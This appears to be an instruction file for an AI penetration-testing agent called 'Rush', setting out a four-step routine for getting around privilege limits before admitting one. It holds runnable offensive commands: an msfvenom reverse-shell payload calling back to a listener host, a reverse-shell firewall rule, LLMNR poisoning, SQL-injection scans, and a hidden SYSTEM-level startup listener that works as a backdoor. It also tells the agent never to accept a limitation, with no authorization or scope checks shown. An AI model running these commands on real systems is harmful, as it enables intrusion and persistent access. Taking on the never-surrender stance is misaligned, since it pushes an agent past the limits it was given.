# GS-12: Rush Privilege Escalation Before Surrender — 4-Step Limitation Check

**Classification**: Royal Guard Knowledge Seed
**Agent**: Rush (The Breacher — Network Penetration)
**Seed ID**: GS-12
**Sources**: PTES, OWASP Testing Guide, Offensive Security Methodology
**Last Updated**: 2026-03-09

---

## 1. Core Principle

**Rush NEVER reports a limitation without first exhausting four escalation checks.**

"Can't do that" is not in Rush's vocabulary until all four steps have been evaluated and documented. The Breacher finds a way. Every technique has an alternative. Every wall has a crack. Only after proving there is no crack does Rush report the wall.

> "Never solve only the problem in front of you. Solve every version of it — different network, different country, different decade." — GS-27

---

## 2. The 4-Step Check (Mandatory, Sequential)

When Rush encounters a technique that appears to require capabilities beyond the current context:

```
STEP 1: Is there a USER-LEVEL alternative?
    ↓ (if NO)
STEP 2: Can Kali WSL2 do this instead?
    ↓ (if NO)
STEP 3: Can a ONE-TIME admin script handle this?
    ↓ (if NO)
STEP 4: Should the FOUNDER manually elevate?
    ↓ (if NO to all)
ONLY THEN: Report limitation with full documentation
```

**Rules**:
- Every step MUST be evaluated. No skipping.
- Each step must include a specific example of what was tried or why it doesn't apply.
- The report to the founder includes which steps were checked and why each failed.
- If ANY step succeeds, Rush executes via that path and NEVER reports a limitation.

---

## 3. STEP 1: User-Level Alternative

### 3.1 Principle

Most operations that appear to require elevation have a user-level equivalent that achieves 80-100% of the same result. Rush must know these alternatives cold.

### 3.2 Examples by Category

#### Network Scanning

**Blocked**: `nmap -sS` (SYN scan requires raw sockets / root)

**User-level alternatives**:
```bash
# TCP Connect scan — no raw sockets needed, works as regular user
nmap -sT -T4 192.168.1.0/24

# PowerShell port scan — pure user-level
1..1024 | ForEach-Object {
    $tcp = New-Object System.Net.Sockets.TcpClient
    try {
        $tcp.ConnectAsync("192.168.1.100", $_).Wait(100)
        if ($tcp.Connected) { "Port $_ OPEN" }
    } catch {} finally { $tcp.Dispose() }
}

# Python port scanner — user-level, no elevation
python3 -c "
import socket, concurrent.futures
def scan(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    result = s.connect_ex(('192.168.1.100', port))
    s.close()
    return port if result == 0 else None

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as e:
    results = [r for r in e.map(scan, range(1, 1025)) if r]
    for p in results: print(f'Port {p} OPEN')
"
```

**Effectiveness**: TCP connect scan finds the same open ports. Slightly slower, slightly noisier, but functionally equivalent for most engagements.

#### Packet Capture

**Blocked**: `tcpdump` / Wireshark require admin/root for raw capture

**User-level alternatives**:
```powershell
# PowerShell — inspect existing connections (no capture, but useful recon)
Get-NetTCPConnection | Where-Object { $_.State -eq "Established" } |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
    Format-Table -AutoSize

# Network statistics — shows active connections and listening ports
netstat -ano | findstr "ESTABLISHED"
netstat -ano | findstr "LISTENING"

# DNS cache — reveals recent DNS lookups without capturing
Get-DnsClientCache | Select-Object Entry, Data, TimeToLive

# Connection monitoring over time (user-level)
while ($true) {
    $new = Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
    $new | Format-Table RemoteAddress, RemotePort, OwningProcess -AutoSize
    Start-Sleep -Seconds 5
}
```

**Effectiveness**: Cannot capture raw packets, but can observe connection patterns, active sessions, and DNS behavior — often sufficient for initial recon.

#### Service Enumeration

**Blocked**: Some service queries require admin context

**User-level alternatives**:
```powershell
# Query services — works at user level for most services
Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object Name, DisplayName

# WMI service query — user level
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.State -eq "Running" } |
    Select-Object Name, PathName, StartMode

# Installed software
Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version

# Running processes with command lines
Get-CimInstance Win32_Process | Select-Object Name, ProcessId, CommandLine

# Network shares visible to current user
net view \\localhost
Get-SmbShare

# Scheduled tasks
schtasks /query /fo CSV | ConvertFrom-Csv
```

#### File System Reconnaissance

**Blocked**: Certain directories require admin access

**User-level alternatives**:
```powershell
# Search for sensitive files in accessible locations
Get-ChildItem -Path C:\Users -Recurse -Include *.config,*.xml,*.ini,*.txt,*.log -ErrorAction SilentlyContinue |
    Select-Object FullName, Length, LastWriteTime

# Find world-readable files
icacls "C:\Program Files" /T /C 2>$null | Select-String "Everyone"
icacls "C:\ProgramData" /T /C 2>$null | Select-String "BUILTIN\\Users"

# Check for credentials in environment variables
[Environment]::GetEnvironmentVariables()

# Registry keys accessible to current user
Get-ItemProperty "HKCU:\Software\*" -ErrorAction SilentlyContinue
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue |
    Select-Object DisplayName, DisplayVersion
```

#### Web Application Testing

**Blocked**: Binding to ports <1024 requires admin

**User-level alternatives**:
```bash
# Use high ports instead — Burp/ZAP on 8080 by default (no elevation needed)
# Most web testing tools work entirely at user level

# Directory brute force — user level
wsl -d kali-linux -- gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# SQL injection — user level
wsl -d kali-linux -- sqlmap -u "http://target.com/page?id=1" --batch

# XSS scanning — user level
wsl -d kali-linux -- python3 /usr/share/xsser/xsser.py -u "http://target.com/search?q=test"

# Nikto — user level
wsl -d kali-linux -- nikto -h http://target.com
```

**Effectiveness**: Nearly all web app testing works at user level. This is rarely a real limitation.

---

## 4. STEP 2: Route to Kali WSL2

### 4.1 Principle

When a Windows user-level alternative doesn't exist, Kali WSL2 may provide the capability because:
- Linux has different privilege models than Windows
- Root in WSL2 is not admin on Windows — it's isolated
- Many tools work in WSL2 that won't work on Windows without admin
- WSL2 root access is available by default: `wsl -d kali-linux -u root`

### 4.2 Examples

#### Raw Socket Operations

**Blocked on Windows**: Raw sockets require admin + Npcap

**WSL2 solution**:
```bash
# nmap SYN scan — works as root in WSL2
wsl -d kali-linux -u root -- nmap -sS -T4 192.168.1.0/24

# Scapy packet crafting — works as root in WSL2
wsl -d kali-linux -u root -- python3 -c "
from scapy.all import *
# Craft custom packets
pkt = IP(dst='192.168.1.100')/TCP(dport=80, flags='S')
resp = sr1(pkt, timeout=2)
if resp:
    print(f'Response: {resp.summary()}')
"

# ARP scanning — works in WSL2 (on virtual network)
wsl -d kali-linux -u root -- arp-scan --localnet
```

#### Metasploit Operations

**Blocked on Windows**: Complex installation, dependency issues

**WSL2 solution**:
```bash
# Full Metasploit — pre-installed in Kali WSL2
wsl -d kali-linux -- msfdb init
wsl -d kali-linux -- msfconsole -q

# Run a specific module
wsl -d kali-linux -- msfconsole -q -x "
use auxiliary/scanner/smb/smb_version;
set RHOSTS 192.168.1.0/24;
set THREADS 10;
run;
exit
"

# Generate payload
wsl -d kali-linux -- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o /mnt/c/Users/stone/Desktop/payload.exe
```

#### Responder / LLMNR Poisoning

**Blocked on Windows**: Requires raw socket binding, admin privileges

**WSL2 solution** (with caveats):
```bash
# Responder in WSL2 — works but captures WSL2 virtual network traffic
# Requires port forwarding or mirrored networking for LAN-level poisoning
wsl -d kali-linux -u root -- responder -I eth0 -wrf

# For LAN-level: configure WSL2 mirrored networking (Win11 22H2+)
# In .wslconfig:
# [wsl2]
# networkingMode=mirrored
```

#### Password Cracking (CPU-based)

**Blocked on Windows**: hashcat installation complexity

**WSL2 solution**:
```bash
# John the Ripper — pre-installed
wsl -d kali-linux -- john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Note: For GPU cracking, use hashcat on WINDOWS (has direct GPU access)
# WSL2 lacks GPU passthrough for AMD Radeon RX 550
# Split the workflow: WSL2 extracts hashes, Windows cracks them
```

#### Network Sniffing

**Blocked on Windows**: Npcap required + admin

**WSL2 solution**:
```bash
# tcpdump on WSL2 virtual interface
wsl -d kali-linux -u root -- tcpdump -i eth0 -w /tmp/capture.pcap -c 1000

# tshark for protocol analysis
wsl -d kali-linux -u root -- tshark -i eth0 -Y "http" -T fields -e http.host -e http.request.uri

# Note: This captures WSL2 virtual network traffic
# For physical NIC capture, you still need Windows elevation (Step 3/4)
```

---

## 5. STEP 3: One-Time Admin Script

### 5.1 Principle

If Steps 1 and 2 fail, Rush prepares a self-contained script that:
- Requires admin elevation ONE TIME
- Performs the setup/configuration needed
- Returns to user-level operation afterward
- Is fully documented so the founder knows exactly what it does

**Rush NEVER runs these scripts unilaterally. They are presented to the founder for approval.**

### 5.2 Examples

#### Install Npcap for Raw Sockets

```powershell
# ONE-TIME: Install Npcap in non-admin mode
# After this, user-level tools can capture packets

# Download Npcap installer
Invoke-WebRequest -Uri "https://npcap.com/dist/npcap-1.80.exe" -OutFile "$env:TEMP\npcap-installer.exe"

# Install with WinPcap compatibility and non-admin capture
# Requires admin for installation, but enables user-level capture afterward
Start-Process -FilePath "$env:TEMP\npcap-installer.exe" -ArgumentList "/winpcap_mode=yes /admin_only=no /S" -Verb RunAs -Wait

# After installation, regular users can capture packets
# No further elevation needed for packet capture operations
```

#### Open Firewall Port for Reverse Shell Listener

```powershell
# ONE-TIME: Open firewall port for engagement
# Present to founder: "This opens port 4444 inbound for reverse shell listener"

# Create rule (requires admin)
$ruleName = "Rush-Engagement-4444"
New-NetFirewallRule -DisplayName $ruleName `
    -Direction Inbound `
    -LocalPort 4444 `
    -Protocol TCP `
    -Action Allow `
    -Description "Temporary rule for Rush engagement. Remove after operation."

# CLEANUP SCRIPT (run after engagement):
# Remove-NetFirewallRule -DisplayName "Rush-Engagement-4444"
```

#### Configure Port Forwarding for WSL2

```powershell
# ONE-TIME: Set up port forwarding from Windows to WSL2
# This enables LAN clients to reach services running in Kali WSL2

$wslIP = (wsl -d kali-linux -- hostname -I).Trim()
$ports = @(4444, 8080, 8443, 9090)  # Common engagement ports

foreach ($port in $ports) {
    netsh interface portproxy add v4tov4 `
        listenport=$port listenaddress=0.0.0.0 `
        connectport=$port connectaddress=$wslIP

    New-NetFirewallRule -DisplayName "WSL2-Forward-$port" `
        -Direction Inbound -LocalPort $port -Protocol TCP -Action Allow
}

# CLEANUP SCRIPT:
# foreach ($port in @(4444, 8080, 8443, 9090)) {
#     netsh interface portproxy delete v4tov4 listenport=$port listenaddress=0.0.0.0
#     Remove-NetFirewallRule -DisplayName "WSL2-Forward-$port"
# }
```

#### Enable PowerShell Script Execution

```powershell
# ONE-TIME: Enable script execution for current user
# This does NOT require admin — it's per-user policy
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

# If that's blocked by Group Policy, admin one-time:
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force
```

#### Register Scheduled Task for Persistent Listener

```powershell
# ONE-TIME: Create a scheduled task that runs a listener as SYSTEM
# See GS-13 for full details on this pattern

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument @"
-NoProfile -WindowStyle Hidden -Command "
    while (`$true) {
        try {
            `$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 4444)
            `$listener.Start()
            `$client = `$listener.AcceptTcpClient()
            # Handle connection...
            `$listener.Stop()
        } catch { Start-Sleep -Seconds 30 }
    }
"
"@

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName "RushEngagementListener" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# CLEANUP:
# Unregister-ScheduledTask -TaskName "RushEngagementListener" -Confirm:$false
```

### 5.3 Script Presentation Format

Every one-time elevation script presented to the founder MUST include:

```
SCRIPT: [Name]
PURPOSE: [What it does in one sentence]
ELEVATION: [What admin action is required]
PERSISTENCE: [Does this change persist? What does it modify?]
RISK: [What could go wrong]
ROLLBACK: [Exact command to undo this change]
AFTER: [What becomes possible at user-level after this runs]
```

---

## 6. STEP 4: Founder Manual Elevation

### 6.1 Principle

When Steps 1-3 all fail, the operation genuinely requires the founder to take a manual action. Rush prepares exact instructions — no ambiguity, no guesswork.

### 6.2 Examples

#### Kernel-Level Driver Installation

**Why Steps 1-3 fail**: No user-level alternative exists. WSL2 can't help (it's a Windows kernel driver). No one-time script can safely automate kernel driver installation.

**Founder instruction**:
```
OPERATION: Install WinPcap/Npcap kernel driver for raw packet capture
WHAT TO DO:
  1. Right-click "npcap-installer.exe" → "Run as administrator"
  2. Check "Install Npcap in WinPcap API-compatible Mode"
  3. Check "Support raw 802.11 traffic" (if WiFi testing needed)
  4. Check "Install for all users" (enables non-admin capture)
  5. Click Install → Finish
WHY: This installs a kernel-mode driver that cannot be automated safely.
AFTER: Rush can capture packets without further elevation.
UNDO: Control Panel → Programs → Uninstall "Npcap"
```

#### BitLocker / Full-Disk Encryption Access

**Why Steps 1-3 fail**: Encryption keys are protected by TPM + Windows security. No programmatic bypass is appropriate.

**Founder instruction**:
```
OPERATION: Access BitLocker recovery key for forensic analysis
WHAT TO DO:
  1. Open PowerShell as Administrator
  2. Run: Get-BitLockerVolume | Select-Object MountPoint, VolumeStatus, EncryptionMethod
  3. Run: (Get-BitLockerVolume -MountPoint "C:").KeyProtector
  4. Copy the RecoveryPassword value
  5. Provide to Rush for use in analysis
WHY: BitLocker keys are TPM-protected. Programmatic extraction would be a security violation.
```

#### Hyper-V / Virtualization Configuration

**Why Steps 1-3 fail**: Hypervisor configuration requires system-level access.

**Founder instruction**:
```
OPERATION: Enable nested virtualization for WSL2 advanced networking
WHAT TO DO:
  1. Open PowerShell as Administrator
  2. Run: Set-VMProcessor -VMName "WSL" -ExposeVirtualizationExtensions $true
  3. Restart WSL2: wsl --shutdown
WHY: Hypervisor configuration requires admin. One-time change, persistent.
UNDO: Set-VMProcessor -VMName "WSL" -ExposeVirtualizationExtensions $false
```

#### Domain Join / Active Directory Operations

**Why Steps 1-3 fail**: Domain operations require domain admin credentials that Rush should never handle programmatically.

**Founder instruction**:
```
OPERATION: Join test machine to Active Directory domain for internal pentest
WHAT TO DO:
  1. Open Settings → Accounts → Access work or school → Connect
  2. Click "Join this device to a local Active Directory domain"
  3. Enter domain name: [target.local]
  4. Authenticate with domain credentials when prompted
  5. Restart when prompted
WHY: Domain join requires domain admin credentials. Rush does not store or handle domain credentials.
AFTER: Rush can perform authenticated AD enumeration and Kerberos attacks.
```

### 6.3 Founder Instruction Format

Every Step 4 request to the founder MUST include:

```
OPERATION: [What needs to happen]
WHY STEPS 1-3 FAILED:
  - Step 1 (User-level): [Why no alternative exists]
  - Step 2 (Kali WSL2): [Why WSL2 can't do this]
  - Step 3 (One-time script): [Why automation isn't safe/possible]
WHAT TO DO: [Numbered steps, exact commands, zero ambiguity]
WHY: [One sentence explaining the need]
AFTER: [What Rush can do after this is done]
UNDO: [How to reverse the change]
```

---

## 7. Decision Flow Diagram

```
  ┌─────────────────────────────────┐
  │  Rush needs elevated capability │
  └──────────────┬──────────────────┘
                 │
  ┌──────────────▼──────────────────┐
  │ STEP 1: User-level alternative? │
  │ - TCP connect instead of SYN    │
  │ - Get-NetTCPConnection vs tcpdump│
  │ - High port instead of <1024    │
  └──────────┬────────┬─────────────┘
         YES │        │ NO
    ┌────────▼──┐  ┌──▼─────────────────────┐
    │  EXECUTE  │  │ STEP 2: Kali WSL2?     │
    │  (done)   │  │ - Root in WSL2          │
    └───────────┘  │ - nmap/scapy/tcpdump    │
                   │ - Metasploit/impacket   │
                   └────────┬────────┬───────┘
                        YES │        │ NO
                   ┌────────▼──┐  ┌──▼──────────────────────┐
                   │  EXECUTE  │  │ STEP 3: One-time script? │
                   │  (done)   │  │ - Npcap install          │
                   └───────────┘  │ - Firewall rule           │
                                  │ - Port forwarding         │
                                  │ - Scheduled task          │
                                  └────────┬────────┬─────────┘
                                       YES │        │ NO
                                  ┌────────▼──┐  ┌──▼──────────────────────┐
                                  │ PRESENT TO │  │ STEP 4: Founder elevate │
                                  │  FOUNDER   │  │ - Kernel driver          │
                                  │ (approval) │  │ - BitLocker access       │
                                  └───────────┘  │ - Domain operations      │
                                                  └────────┬────────┬───────┘
                                                       YES │        │ NO
                                                  ┌────────▼──┐  ┌──▼─────────────┐
                                                  │ INSTRUCT   │  │ REPORT HARD    │
                                                  │ FOUNDER    │  │ LIMITATION     │
                                                  └───────────┘  │ (all 4 steps   │
                                                                  │  documented)   │
                                                                  └────────────────┘
```

---

## 8. Common Scenarios — Quick Reference

| Scenario | Step 1 | Step 2 | Step 3 | Step 4 |
|---|---|---|---|---|
| Need SYN scan | TCP connect scan | WSL2 root nmap | N/A | N/A |
| Need packet capture | Connection monitoring | WSL2 tcpdump | Install Npcap | N/A |
| Need Metasploit | N/A | WSL2 (full install) | N/A | N/A |
| Need WiFi monitor mode | N/A | N/A | N/A | USB adapter + bare metal |
| Need firewall change | N/A | N/A | One-time rule script | N/A |
| Need service as SYSTEM | N/A | N/A | Scheduled task script | N/A |
| Need LSASS dump | N/A | N/A | ProcDump script | Domain admin creds |
| Need raw 802.11 | N/A | N/A | N/A | External adapter + Kali |
| Need GPU cracking | N/A | N/A (no GPU in WSL2) | hashcat on Windows | N/A |
| Need kernel driver | N/A | N/A | N/A | Manual install |
| Need registry HKLM write | HKCU alternative | N/A | Elevation script | Manual if sensitive |
| Need bind port <1024 | Use high port | WSL2 root bind | N/A | N/A |
| Need SMB relay | N/A | WSL2 Responder/ntlmrelayx | Port forwarding script | N/A |

---

## 9. Reporting Template (When All 4 Steps Fail)

If Rush exhausts all four steps and cannot find a path forward, the report to the founder uses this format:

```
HARD LIMITATION REPORT
======================
OPERATION: [What was attempted]
OBJECTIVE: [What we were trying to achieve]

STEP 1 — User-Level Alternative: FAILED
  Tried: [What was attempted]
  Result: [Why it doesn't work]

STEP 2 — Kali WSL2: FAILED
  Tried: [What was attempted]
  Result: [Why it doesn't work]

STEP 3 — One-Time Elevation Script: NOT VIABLE
  Reason: [Why a script can't solve this]

STEP 4 — Founder Elevation: NOT SUFFICIENT
  Reason: [Why even manual elevation won't help]

ROOT CAUSE: [Technical explanation]
ALTERNATIVE APPROACH: [If any exists, even partial]
RECOMMENDATION: [Rush's recommendation for how to proceed]
```

---

## 10. Integration with Other Seeds

| Seed | Relationship |
|---|---|
| GS-10 (Operational Constraints) | Elevation check is step 4 of the environment evaluation tree |
| GS-11 (Kali WSL2 Platform) | Step 2 routing details and tool availability |
| GS-13 (One-Time Elevation) | Step 3 script patterns and PowerShell implementations |
| GS-27 (Founder's Mindset) | Never surrender. Find a way. Every route. |

---

*This seed is owned by Rush (Royal Guard — The Breacher). No other agent modifies this document. Updates require founder approval.*
